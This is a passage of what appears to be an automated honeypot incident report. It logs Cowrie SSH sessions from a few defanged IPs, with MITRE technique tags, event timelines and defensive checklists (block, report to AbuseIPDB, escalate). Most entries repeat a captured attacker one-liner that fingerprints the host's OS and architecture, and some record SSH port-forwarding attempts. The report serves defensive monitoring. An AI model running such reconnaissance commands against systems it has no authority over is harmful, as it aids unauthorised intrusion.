| `2026-08-04 04:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee4ff3c30ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:31 |
| **Last Seen** | 2026-08-04 04:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:31:04` | `cowrie.session.connect` |
| `2026-08-04 04:31:04` | `cowrie.client.version` |
| `2026-08-04 04:31:04` | `cowrie.client.kex` |
| `2026-08-04 04:31:06` | `cowrie.login.success` |
| `2026-08-04 04:31:07` | `cowrie.session.params` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.success` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.command.input` |
| `2026-08-04 04:31:07` | `cowrie.log.closed` |
| `2026-08-04 04:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b88f8f07db3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:33 |
| **Last Seen** | 2026-08-04 04:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:33:05` | `cowrie.session.connect` |
| `2026-08-04 04:33:06` | `cowrie.client.version` |
| `2026-08-04 04:33:06` | `cowrie.client.kex` |
| `2026-08-04 04:33:07` | `cowrie.login.success` |
| `2026-08-04 04:33:09` | `cowrie.session.params` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.success` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.command.input` |
| `2026-08-04 04:33:09` | `cowrie.log.closed` |
| `2026-08-04 04:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01eb51d5750

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:35 |
| **Last Seen** | 2026-08-04 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:35:10` | `cowrie.session.connect` |
| `2026-08-04 04:35:11` | `cowrie.client.version` |
| `2026-08-04 04:35:11` | `cowrie.client.kex` |
| `2026-08-04 04:35:12` | `cowrie.login.success` |
| `2026-08-04 04:35:13` | `cowrie.session.params` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.success` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.command.input` |
| `2026-08-04 04:35:13` | `cowrie.log.closed` |
| `2026-08-04 04:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371df380a6b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:37 |
| **Last Seen** | 2026-08-04 04:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:37:15` | `cowrie.session.connect` |
| `2026-08-04 04:37:16` | `cowrie.client.version` |
| `2026-08-04 04:37:16` | `cowrie.client.kex` |
| `2026-08-04 04:37:17` | `cowrie.login.success` |
| `2026-08-04 04:37:18` | `cowrie.session.params` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.success` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.command.input` |
| `2026-08-04 04:37:18` | `cowrie.log.closed` |
| `2026-08-04 04:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1162cf64ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:39 |
| **Last Seen** | 2026-08-04 04:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:39:22` | `cowrie.session.connect` |
| `2026-08-04 04:39:22` | `cowrie.client.version` |
| `2026-08-04 04:39:22` | `cowrie.client.kex` |
| `2026-08-04 04:39:24` | `cowrie.login.success` |
| `2026-08-04 04:39:25` | `cowrie.session.params` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.success` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.command.input` |
| `2026-08-04 04:39:25` | `cowrie.log.closed` |
| `2026-08-04 04:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129dfd2b7cc6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:41 |
| **Last Seen** | 2026-08-04 04:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:41:21` | `cowrie.session.connect` |
| `2026-08-04 04:41:22` | `cowrie.client.version` |
| `2026-08-04 04:41:22` | `cowrie.client.kex` |
| `2026-08-04 04:41:23` | `cowrie.login.success` |
| `2026-08-04 04:41:25` | `cowrie.session.params` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.success` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.command.input` |
| `2026-08-04 04:41:25` | `cowrie.log.closed` |
| `2026-08-04 04:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b214df90a98

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-08-04 04:42 |
| **Last Seen** | 2026-08-04 04:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:42:30` | `cowrie.session.connect` |
| `2026-08-04 04:42:31` | `cowrie.client.version` |
| `2026-08-04 04:42:31` | `cowrie.client.kex` |
| `2026-08-04 04:42:33` | `cowrie.login.success` |
| `2026-08-04 04:42:33` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb644b4a7ff7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:43 |
| **Last Seen** | 2026-08-04 04:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:43:16` | `cowrie.session.connect` |
| `2026-08-04 04:43:16` | `cowrie.client.version` |
| `2026-08-04 04:43:16` | `cowrie.client.kex` |
| `2026-08-04 04:43:18` | `cowrie.login.success` |
| `2026-08-04 04:43:20` | `cowrie.session.params` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.success` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.command.input` |
| `2026-08-04 04:43:20` | `cowrie.log.closed` |
| `2026-08-04 04:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f061bee4dc0

| Field | Detail |
|---|---|
| **Source IP** | `45.154.244[.]193` |
| **First Seen** | 2026-08-04 04:43 |
| **Last Seen** | 2026-08-04 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:43:48` | `cowrie.session.connect` |
| `2026-08-04 04:43:48` | `cowrie.client.version` |
| `2026-08-04 04:43:48` | `cowrie.client.kex` |
| `2026-08-04 04:43:49` | `cowrie.login.success` |
| `2026-08-04 04:43:49` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:43:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-04 04:43:49` | `cowrie.direct-tcpip.data` |
| `2026-08-04 04:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.154.244[.]193` to AbuseIPDB if not already reported
- [ ] Block `45.154.244[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daa24e852edc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:45 |
| **Last Seen** | 2026-08-04 04:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:45:15` | `cowrie.session.connect` |
| `2026-08-04 04:45:15` | `cowrie.client.version` |
| `2026-08-04 04:45:15` | `cowrie.client.kex` |
| `2026-08-04 04:45:17` | `cowrie.login.success` |
| `2026-08-04 04:45:19` | `cowrie.session.params` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.success` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.command.input` |
| `2026-08-04 04:45:19` | `cowrie.log.closed` |
| `2026-08-04 04:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed7b73cb908

| Field | Detail |
|---|---|
| **Source IP** | `193.24.211[.]204` |
| **First Seen** | 2026-08-04 04:45 |
| **Last Seen** | 2026-08-04 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:45:55` | `cowrie.session.connect` |
| `2026-08-04 04:45:55` | `cowrie.client.version` |
| `2026-08-04 04:45:56` | `cowrie.client.kex` |
| `2026-08-04 04:45:56` | `cowrie.login.success` |
| `2026-08-04 04:45:56` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:45:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-04 04:45:56` | `cowrie.direct-tcpip.data` |
| `2026-08-04 04:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.24.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `193.24.211[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f207df054a32

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:47 |
| **Last Seen** | 2026-08-04 04:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:47:17` | `cowrie.session.connect` |
| `2026-08-04 04:47:17` | `cowrie.client.version` |
| `2026-08-04 04:47:18` | `cowrie.client.kex` |
| `2026-08-04 04:47:19` | `cowrie.login.success` |
| `2026-08-04 04:47:20` | `cowrie.session.params` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.success` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.command.input` |
| `2026-08-04 04:47:20` | `cowrie.log.closed` |
| `2026-08-04 04:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420eeb11b383

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:49 |
| **Last Seen** | 2026-08-04 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:49:23` | `cowrie.session.connect` |
| `2026-08-04 04:49:23` | `cowrie.client.version` |
| `2026-08-04 04:49:23` | `cowrie.client.kex` |
| `2026-08-04 04:49:24` | `cowrie.login.success` |
| `2026-08-04 04:49:25` | `cowrie.session.params` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.success` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.command.input` |
| `2026-08-04 04:49:25` | `cowrie.log.closed` |
| `2026-08-04 04:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a8e8f1d4d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:51 |
| **Last Seen** | 2026-08-04 04:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
